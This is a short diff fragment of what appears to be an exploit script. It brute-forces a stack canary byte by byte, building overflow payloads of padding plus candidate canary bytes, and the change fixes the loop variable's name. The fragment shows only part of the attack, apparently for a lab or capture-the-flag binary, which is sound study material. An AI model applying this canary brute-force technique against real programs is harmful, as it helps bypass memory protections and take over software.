@@ -21,7 +21,7 @@ while len(canary_value)<4:
   print(f" trying canary index {len(canary_value)}...")
   for bytes in range(1, 256):
     payload = b"".join([b"A"*offset,
-    canary_value + chr(byte).encode('utf-8'),
+    canary_value + chr(bytes).encode('utf-8'),
     b"\n"])
     
     with open("payload", "wb") as flip:
